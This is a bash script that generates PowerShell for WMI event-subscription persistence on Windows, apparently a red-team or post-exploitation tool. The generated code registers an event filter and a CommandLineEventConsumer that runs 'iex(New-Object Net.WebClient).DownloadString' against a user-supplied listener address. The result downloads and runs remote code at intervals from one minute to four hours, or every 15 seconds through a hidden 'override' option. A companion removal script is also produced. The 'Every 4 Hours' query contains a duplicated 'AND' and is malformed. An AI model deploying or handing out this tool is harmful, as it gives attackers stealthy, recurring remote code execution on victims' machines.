#!/bin/bash


echo "Enter address for listener payload (ex. 192.168.142.134:9090/x)"
read address
echo "Enter name for filter (ex. ServiceFilter)"
read filter
echo "Enter name for consumer (ex. ServiceConsumer)"
read consumer
echo "Enter output filename"
read tgt
delete="_remove"
remove_file=$tgt$delete


echo "Choose Beacon Interval"
echo -e "\n1.  Every Minute"
echo -e "2.  Every 15 Minutes"
echo -e "3.  Every 30 Minutes"
echo -e "4.  Every Hour"
echo -e "5.  Every 4 Hours"
read interval


case "$interval" in

1)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0\""
    interval="Every Minute"
    ;;
2)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45) AND TargetInstance.Second=0\""
    interval="Every 15 Minutes"
    ;;
3)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1 OR TargetInstance.Minute=30) AND TargetInstance.Second=0\""
    interval="Every 30 Minutes"
    ;;
4)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Minute=1) AND TargetInstance.Second=0\""
    interval="Every Hour"
    ;;
5)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Hour=0 OR TargetInstance.Hour=4 OR TargetInstance.Hour=8 OR TargetInstance.Hour=12 OR TargetInstance.Hour=16 OR TargetInstance.Hour=20) AND AND TargetInstance.Minute=1 AND TargetInstance.Second=0\""
    interval="Every 4 Hours"
    ;;
override)  interval_setting="\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\""
           interval="EVERY 15 SECONDS" 
           ;;

esac


echo "Filter Name:      $filter"
echo "Consumer Name:    $consumer"
echo "Output File:      $tgt"
echo "Removal File:     $remove_file"
echo "Interval Setting: $interval"

echo -e "\n\nPress Enter to continue, CTRL+C to abort"
read continue

echo "\$instanceFilter = ([wmiclass]\"\\\\.\\root\\subscription:__EventFilter\").CreateInstance()" > $tgt
echo "\$instanceFilter.QueryLanguage = \"WQL\"" >> $tgt
#echo "\$instanceFilter.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.Second=0 OR TargetInstance.Second=15 OR TargetInstance.Second=30 OR TargetInstance.Second=45)\"" >> $tgt
echo "$interval_setting" >>$tgt
echo "\$instanceFilter.Name = \"$filter\"" >> $tgt
echo "\$instanceFilter.EventNamespace = 'root\cimv2'" >> $tgt
echo "\$result = \$instanceFilter.Put()" >> $tgt
echo "\$newFilter = \$result.Path" >> $tgt
echo "\$instanceConsumer = ([wmiclass]\"\\\\.\\root\\subscription:CommandLineEventConsumer\").CreateInstance()" >> $tgt
echo "\$instanceConsumer.Name = '$consumer'" >> $tgt
echo "\$instanceConsumer.CommandLineTemplate  = \"powershell -command \`\"iex(New-Object Net.WebClient).DownloadString('http://$address')\`\"\"" >> $tgt
echo "\$result = \$instanceConsumer.Put()" >> $tgt
echo "\$newConsumer = \$result.Path" >> $tgt
echo "\$instanceBinding = ([wmiclass]\"\\\\.\\root\\subscription:__FilterToConsumerBinding\").CreateInstance()" >> $tgt
echo "\$instanceBinding.Filter = \$newFilter" >> $tgt
echo "\$instanceBinding.Consumer = \$newConsumer" >> $tgt
echo "\$result = \$instanceBinding.Put()" >> $tgt
echo "\$newBinding = \$result.Path" >> $tgt
echo "\$x=\"\\\\.\\root\\subscription:__EventFilter.Name='$filter'\"" > $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file
echo "\$x=\"\\\\.\\root\\subscription:CommandLineEventConsumer.Name='$consumer'\"" >> $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file
echo "\$x='\\\\.\\root\\subscription:__FilterToConsumerBinding.Consumer=\"\\\\\\\\.\\\\root\\\\subscription:CommandLineEventConsumer.Name=\\\"$consumer\\\"\",Filter=\"\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"$filter\\\"\"'" >> $remove_file
echo "([wmi]\$x).Delete()" >> $remove_file
echo -e "\n\nComplete..."






